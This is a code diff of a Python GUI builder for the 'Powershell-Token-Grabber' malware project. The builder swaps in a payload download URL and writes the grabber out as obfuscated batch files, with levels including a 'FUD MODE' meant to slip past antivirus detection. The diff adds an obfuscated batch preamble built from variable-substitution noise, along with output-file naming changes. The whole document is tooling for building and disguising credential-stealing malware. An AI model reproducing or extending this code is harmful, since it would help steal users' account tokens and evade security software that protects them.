@@ -45,6 +45,14 @@ set "n=a" && set "o=b" && set "p=c" && set "q=d" && set "r=e" && set "s=f" && se
 chcp 65001 > nul
 """
 
+extra = r"""
+@%RxMNz%%r%%nUIlcBd%%p%%mhrVm%%u%%RtSCWJ%%b%%kiZGY% %GeGoy%%b%%InCEfFO%%s%%yJxSIOx%%s%%xdbjX%
+%f%%sYEQE%%r%%xCmOuSZg%%g%%DUhhNq% %SLbRJT%"%AxsNRv%%a%%qDYwAk%=%uFuYF%%n%%CNFUN%"%zWDlXT% %TbjcgI%&%WYZEk%&%SPSicuCY% %lCGAhLiW%%f%%pnuIuOr%%r%%sMyTXB%%g%%jDUeAXz% %maflzh%"%BcgODO%%b%%qQiDxyr%=%dTIhz%%o%%QBfvLeyt%"%mEFjSzlh% %WdOIRP%&%mvTUkF%&%RUIGunA% %KKznffYe%%f%%gSZOp%%r%%AXNqiQIR%%g%%FruCgfG% %XOomVZ%"%QGWcTH%%c%%VsSgBE%=%HaVOcLIA%%p%%Efgwgo%"%RKLcR% %PTrkQTd%&%BDtZD%&%khhZlU% %mvJVOi%%f%%oTNFxSk%%r%%kxzAc%%g%%qCAWJ% %XWCdOsY%"%gJSAk%%d%%XzHFgqd%=%siwJOkh%%q%%uGoqaJ%"%JyLZYjy% %RAeBlfFn%&%ybUDTMUX%&%HTNGmU% %GzWjibT%%f%%TCsti%%r%%hPDLWOk%%g%%eMNqj% %enZnv%"%CQvOXry%%e%%bckvy%=%knMoIoK%%r%%MNqwuXM%"%AkawnBTH% %eLeIAU%&%xSlBmv%&%WUxqZ% %SUtcl%%f%%djfTMAr%%r%%cUygo%%g%%gyxdm% %GlZzP%"%pSNEdZp%%f%%rcxsMv%=%UEijoxb%%s%%koHOAvCQ%"%AdPtKMg% %SASpQTlo%&%HGbTLxs%&%oolAwnMu% %TmdesToS%%f%%qEOSYG%%r%%ZLOqNpnC%%g%%reXCw% %EjtlVyzH%"%fSpNWO%%g%%fyPeKB%=%GQLQfEb%%t%%afCauW%"%OfDpG% %BtJFjiSj%&%LexrviJ%&%rpiXiVq% %GqOHyekI%%f%%ThDUDJ%%r%%cUvnK%%g%%vPUmFTd% %HRITnf%"%KMrhsj%%h%%wqsNJ%=%oEYMfno%%u%%dRiWq%"%qSuXU% %aJQCrZZ%&%zSana%&%QSKZSR% %mnNfvWSZ%%f%%FAcbAlu%%r%%vBxrf%%g%%hxtphip% %DKOgRM%"%mdOuOHaS%%i%%RhoNXMfr%=%VMFcaXTX%%v%%RsHRUna%"%FJGJEZ% %nKmAg%&%Lwuxyip%&%qlvxjqP% %qSdfCrE%%f%%ogSkF%%r%%EVupV%%g%%NJenBRTy% %QkLMEIAj%"%beVffckP%%j%%ceKAK%=%Ytowb%%w%%HTWhtmx%"%EtzJRheG% %iTuDGGq%&%qayLWxg%&%hAREn% %FdCmMzO%%f%%DrpQtO%%r%%fZRirPP%%g%%WCQrmRzv% %lciXx%"%jVwFOW%%k%%NEUtLefI%=%FDFfpHaD%%x%%suIGqrZ%"%xzxQUTgD% %qgXLF%&%zTeUXxxY%&%ysppZPL% %fkTLMs%%f%%fhikmAR%%r%%mVHxuSdu%%g%%YuqlD% %wgkBbzML%"%Sqiqs%%l%%WJLzyHf%=%NyTJwAC%%y%%buVXNM%"%mzKOyyGv% %ZSWOIJ%&%vfLsqtl%&%LYFgyjiC% %LYbjDkb%%f%%kTUIAnIl%%r%%tArLTDVU%%g%%makekUHe% %iSHEhlry%"%gNjNz%%m%%krysT%=%Hobnbchz%%z%%HqCqBW%"%pLlCJI% %OcKvC%&%ceUlVnd%&%JWPjMm% %KcMnrPWx%%f%%KbnDLEa%%r%%LdAqJFx%%g%%yrOsH% %cDdiZRc%"%VQYSZ%%n%%wtLPWl%=%NnZULf%%a%%FxbENTk%"%fnNvvWqE% %IRreSMs%&%HyPTVWP%&%RSWtU% %VscpVM%%f%%ONEze%%r%%nSsPLt%%g%%KFsNs% %iKPzI%"%CEuoICWC%%o%%iVyjkyll%=%PGtmKLi%%b%%iLaeq%"%JepxVJk% %JVzmE%&%QRewDFz%&%sIIztwiV% %gPXOv%%f%%vCwvc%%r%%sTETPL%%g%%czkzmOLu% %dekKg%"%LfFRy%%p%%rCJyyx%=%dfpUhS%%c%%hiWlmy%"%Ylvis% %fjjMpcm%&%HIBhzFHR%&%iFyUfxb% %vZlYStJ%%f%%MGfJDY%%r%%TlVMV%%g%%WdlGiZKW% %RCyDNJhV%"%FfFDk%%q%%KSMaRj%=%kIbPfyH%%d%%SnLxLdk%"%MwAFl% %nyoLCVqG%&%NhAOftM%&%DXNWTig% %oFHbXVqM%%f%%goquRGJd%%r%%czXNW%%g%%HQwMJGv% %SJEak%"%cMZIHCSg%%r%%MSwiS%=%oTJCXfO%%e%%pBFwPS%"%afSvo% %nGmSI%&%XQDvmTc%&%IbzxxKPx% %EhYCIEyO%%f%%oXaVcZS%%r%%OHRYKtBm%%g%%QwqItw% %gZxcxqd%"%BPNNzh%%s%%atILula%=%GPgOR%%f%%YKYcB%"%ZczGfZw% %vzHPa%&%dVYCv%&%zEjLcqw% %ogNATyDy%%f%%oQPQWl%%r%%GOzfCP%%g%%QmNhVQ% %OmaazK%"%AdNIAE%%t%%dNHUyl%=%GGmRDdAr%%g%%FzgiLk%"%ZjucXfV% %VxxRN%&%DLwTbQT%&%fbRSw% %HJBmD%%f%%nxGOz%%r%%QbZpFf%%g%%moXNJTP% %frIBW%"%LfOjJ%%u%%oghbgkAo%=%JwOOmByy%%h%%DoooOUp%"%AcoxHXS% %utqNLFD%&%izoDLq%&%WDBPkJQ% %cpIAa%%f%%pXvUqNI%%r%%QwZfgbz%%g%%jsyzpTXh% %VtBfqdui%"%urzqO%%v%%yNBsX%=%kOtLwf%%i%%iFeZj%"%DECkj% %BeaDL%&%PYaaVwb%&%nKZJH% %zqbQlCy%%f%%zQxgxPdT%%r%%GaqCud%%g%%mFeuTaR% %cgQaAK%"%dRjZY%%w%%mICvJ%=%GgvsIcs%%j%%WRMPmlfE%"%tNUkYH% %sEYIw%&%vzDyobC%&%Wgctq% %jZWzLqpl%%f%%oXLsZHL%%r%%MGQfKYk%%g%%jyIUsylG% %KdaIyV%"%zuqVepA%%x%%PZCuCnX%=%zkJTcChk%%k%%ifUCjd%"%zpTsIVSN% %DGbVOgZ%&%akjZQuLX%&%twSTf% %hCeWFT%%f%%qzHAa%%r%%pUYga%%g%%WCdrF% %xRoIMUom%"%MBMUwF%%y%%wVsSg%=%WYWqkXa%%l%%MbXeAoWy%"%GfYgmObb% %EGKMVN%&%piaqrqCi%&%IVkadw% %brTsQ%%f%%GPpiSG%%r%%FtmJjhmh%%g%%zXmDS% %ThhFOvV%"%UDhGLMF%%z%%kcVpUFBN%=%nbWRwV%%m%%KuDKFIZ%"%jWeIlOPw% %zkZHA%&%wTCYRSU%&%rGnhFeo% %IHiNLDyg%%f%%tJRFuAt%%r%%SgdvZe%%g%%KsWcDj% %cmuKjVQ%"%WjhQanL%%A1%%ljmtm%1%CJtCrzH%=%LOTXng%%N1%%RWyJRuzS%"%mCiWO% %VZEtDvQv%&%YuaUd%&%TPlocxKC% %xXgaKG%%f%%IaJiR%%r%%ZahrGuB%%g%%vXbEpgW% %tBlUq%"%JpYEV%%B1%%BAemGz%1%aGlAf%=%TwzzzN%%O1%%hesOy%"%TuIkRnj% %fpsHNsMi%&%WMuWwk%&%dhuJuP% %wFlDoM%%f%%huCrN%%r%%jjcSd%%g%%sayUqZK% %oCqpYC%"%lMABffz%%C1%%kOYuSno%1%hrQfKZ%=%NQvAMDm%%P1%%teaLsr%"%ELEIA% %vXPLlQp%&%BIoByC%&%Lhadt% %dPZGVP%%f%%dWAnVjvq%%r%%OPDzDh%%g%%LwCsFW% %lKbiqnQK%"%RqhqmTs%%D1%%rXfDFB%1%Ptyme%=%HSjZuHWk%%Q1%%HqSikREC%"%rUeyM% %UDywxoX%&%LNmSvC%&%OeOYBk% %OlCaVv%%f%%fAnneauH%%r%%CXnDc%%g%%LNAJX% %ZBgDj%"%WXqSFi%%E1%%sqLbbvq%1%BzQtd%=%UelnHwQ%%R1%%iuKlulWO%"%kbyQPjiE% %PFyKbAf%&%cqHQx%&%ClrFxg% %iFOWE%%f%%Lfwcj%%r%%HoQJQ%%g%%uCAyvCW% %QJkbklzN%"%BsUrZPc%%F1%%pDkpqo%1%EPczn%=%sZJLSV%%S1%%VEyNs%"%oXxTQTZ% %YGZPbq%&%KubvzEk%&%oVOrfH% %JhUhLppq%%f%%MCaVUwiG%%r%%ijHwmNu%%g%%fGXaiPYp% %jrkuDW%"%zAicr%%G1%%aRSJjQ%1%aCHdkgL%=%iqnAIRYY%%T1%%XGdmY%"%QlkUTXQz% %ZuVHb%&%kIzjLU%&%gaLUO% %FcuGwt%%f%%JmpcnbO%%r%%BEtSw%%g%%DwCkmVX% %jCUXQqs%"%ZTkVLgr%%H1%%jnumly%1%ngfntx%=%qeBipRf%%U1%%Xcblh%"%JcrwuEa% %AeXQu%&%YrLSdm%&%Qxixxh% %fDhjIO%%f%%ZQVllUAo%%r%%sVlbN%%g%%VwtVNaWm% %igiUn%"%mokRHE%%I1%%MozVnJJo%1%LkuIrCHx%=%getNLp%%V1%%GsLjhCYi%"%aBkHkYg% %CbxjsTh%&%TajrfMXW%&%VhQErZl% %uOkPr%%f%%XwcIXXPj%%r%%RoMsG%%g%%wfHEQ% %oPEpxTz%"%AFLWXCz%%J1%%whdbPFo%1%kOjoh%=%cpfqtmJ%%W1%%ikZkDP%"%wGmABTkC% %xBBfQ%&%Dqlen%&%WIlNcM% %TYcchh%%f%%JVOWuVAc%%r%%TzjsPyFN%%g%%pQoFG% %hPYQLwi%"%DyTcqif%%K1%%QBjHzaC%1%BXLUUqt%=%VQwjToZ%%X1%%jlrHKO%"%eqnRJ% %hxFYfHa%&%DnStKgz%&%ywrQcF% %rodOqkTQ%%f%%ygLziKa%%r%%VknfM%%g%%yjKYPY% %zbOTIJB%"%StWqkqU%%L1%%LcaKl%1%JFrBy%=%zfajWB%%Y1%%nNCMqQz%"%DfnjhXPW% %dLpElT%&%AjHqvCek%&%eqDnCU% %rYBPB%%f%%aicWQB%%r%%zdmXauG%%g%%jimaluAc% %vnPTDiJi%"%MZksc%%M1%%MBZsjw%1%FZzPTAGc%=%VMJBxzr%%Z1%%zfqjDtM%"%yapPMOOV% %ArLcwgSx%&%zccxxZaZ%&%TGUxMo% %LRTCin%%f%%XvfPiRq%%r%%gChSo%%g%%ICqIXhn% %rTGmkHbc%"%jDimdDT%%N1%%cHtfG%1%FnWqpVd%=%tfpBDhZ%%A1%%MBmRuKh%"%RDnoGF% %NwRTu%&%eLtSCsDc%&%IsFPI% %RyDUYtS%%f%%IiVRiuRi%%r%%bdMBys%%g%%pAusHqbS% %qcmcZwtw%"%UdtqCF%%O1%%tswjY%1%NEVwmT%=%RKpeHqW%%B1%%GcJZne%"%miiED% %DjWukIm%&%QzkvRqqQ%&%gcvrmgHd% %hAHWEy%%f%%YUCHZR%%r%%zdIWXpD%%g%%AWikO% %MnknSLE%"%jkgzBNS%%P1%%EFMcSY%1%uJomfyo%=%VXAXqW%%C1%%pBEbgR%"%lPISlR% %EgeCmUi%&%cIRFDsQ%&%cIvywJqw% %GyKthnG%%f%%PNJAr%%r%%JuHiGnPy%%g%%ujOwpAR% %ycQnimHL%"%IHvHwV%%Q1%%XzrHqF%1%GJwFnB%=%qEoAMgrt%%D1%%eeqqn%"%gyYTCCay% %KYnXeVb%&%FjLMx%&%BVeWeuxp% %gIKNsyTq%%f%%xLtaDaRM%%r%%lGPKNG%%g%%MizgPwt% %BWpIe%"%NbsSJOp%%R1%%UrjsUvq%1%dLMHhJT%=%vMsIUA%%E1%%frgaJBt%"%MoGyAK% %PRQfDVkZ%&%jFcAbx%&%GtBbW% %EocZZ%%f%%srNIPQJ%%r%%PsVZoa%%g%%mnNrn% %SfnHQY%"%fdCIMr%%S1%%VnOFQt%1%mMxUUdi%=%aFGVOHXq%%F1%%ZNhRzwo%"%ZOpFx% %wvXMYIC%&%LCuRAfQ%&%moJnRDAu% %VUDVudWj%%f%%ETRbH%%r%%wdpFs%%g%%sjKVrJ% %hpSjH%"%WtECM%%T1%%AOHgDjQd%1%VtAdwANm%=%stlcVp%%G1%%TauJLsw%"%YWwLzEjR% %LaxCD%&%nxalhpae%&%vbumVSI% %fmNTT%%f%%EGBRa%%r%%NebRb%%g%%gFbNE% %oMaHMjB%"%THmONJw%%U1%%mFhgy%1%qVHYG%=%NdWGzmts%%H1%%TSEPdpr%"%UDeGAt% %iNhhqULr%&%wfWCh%&%WLuvkx% %bbTMaF%%f%%lKJTYi%%r%%OPZbBqaI%%g%%yzdjmiAq% %wGcLQI%"%yFohEUh%%V1%%EvSqD%1%bQbpc%=%JmCEg%%I1%%iKjNjTG%"%yGeuvL% %PgFTfJp%&%yCHQvdvx%&%Hdcton% %XDulV%%f%%TtJzEzm%%r%%navVZnGj%%g%%opTDJe% %GVMijrtw%"%ichZEc%%W1%%Sygpk%1%njjmP%=%OOKRhg%%J1%%VtsMM%"%ofRQkaf% %WtxaPNZ%&%wgCZl%&%FETLnO% %QkqXW%%f%%vNUAX%%r%%WVEjdiwn%%g%%dsopw% %XVKQZira%"%IXint%%X1%%daLkrB%1%jOCpuKY%=%UkNgY%%K1%%oHvUu%"%bCZfkBD% %cWUPnlmp%&%GbdiePa%&%toiivSH% %xFsWyDAs%%f%%iAbXiL%%r%%HGjacK%%g%%cQAWIBi% %lQUTp%"%WLTpUA%%Y1%%tMRPEg%1%LBvFmy%=%hZxWgnwr%%L1%%ejGRW%"%lGtKVX% %GAvhFIf%&%TFUcNH%&%Upfqw% %CifiE%%f%%eJoEupD%%r%%WIzxYhJ%%g%%RygoRDY% %HvYslB%"%dCqabzHx%%Z1%%VOtFo%1%HIDxDUg%=%uPunvI%%M1%%KcFfmxo%"%ztNLwMLK%
+%p%%ENkIjd%%u%%OoZtna%%p%%aMYAe%%c%%GgdXQ% %fqfiL%6%PpzcZ%5%JzuPcX%0%OpiUCtW%0%vDiCbK%1%hsEOvez% %WMxuNMD%> %HGXJdpVw%%a%%ObsWTnhi%%h%%srkfeXs%%y%%XMxylVIq%
+"""
+
+extra = False
+
 class Buidler(kdot.CTk):
     def __init__(self):
         super().__init__()
@@ -252,18 +260,18 @@ class Buidler(kdot.CTk):
             self.code.replace('https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/test.exe', direct_download_url)
         if obfuscate == "Level 1":
             self.level1()
-            self.create_top_level("main.level1.bat is the finished product!")
+            self.create_top_level(f"{self.name} is the finished product!")
         elif obfuscate == "Level 2":
             self.level2()
-            self.create_top_level("main.level2.bat is the finished product!")
+            self.create_top_level(f"{self.name} is the finished product!")
         elif obfuscate == "Level 3":
             self.level3()
-            self.create_top_level("main.level3.bat is the finished product!")
+            self.create_top_level(f"{self.name} is the finished product!")
         elif obfuscate == "All":
             self.all()
         elif obfuscate == "FUD MODE":
             self.fud()
-            self.create_top_level("main.fud.bat is the finished product!")
+            self.create_top_level(f"{self.name} is the finished product!")
         elif obfuscate == "None":
             with open("main.bat", "w") as f:
                 f.write(self.code)
@@ -288,7 +296,11 @@ class Buidler(kdot.CTk):
         carrot = False
         var = False
         with open("main.level1.bat", "a+", encoding="utf-8") as f:
-            f.write(code)
+            self.name = f.name
+            if extra == True:
+                f.write(extra)
+            else:
+                f.write(code)
             for line in self.code:
                 for char in line:
                     if char == ">":
@@ -331,6 +343,7 @@ class Buidler(kdot.CTk):
         var = False
         with open("main.level2.bat", "a+", encoding="utf-8") as f:
             f.write(f"set KDOT={random_order}\nchcp 65001 > nul\n")
+            self.name = f.name
             for line in self.code:
                 for char in line:
                     if char == ">":
@@ -372,6 +385,7 @@ class Buidler(kdot.CTk):
         out_hex.extend(['{:02X}'.format(b) for b in penis])
 
         with open(f'main.level3.bat', 'wb') as f:
+            self.name = f.name
             for i in out_hex:
                 f.write(bytes.fromhex(i))
                 
@@ -397,6 +411,7 @@ class Buidler(kdot.CTk):
         var = False
         with open("main.fud.bat", "a+", encoding="utf-8") as f:
             f.write("::Made by K.Dot\n")
+            self.name = f.name
             for line in self.code:
                 for char in line:
                     if char == ">":
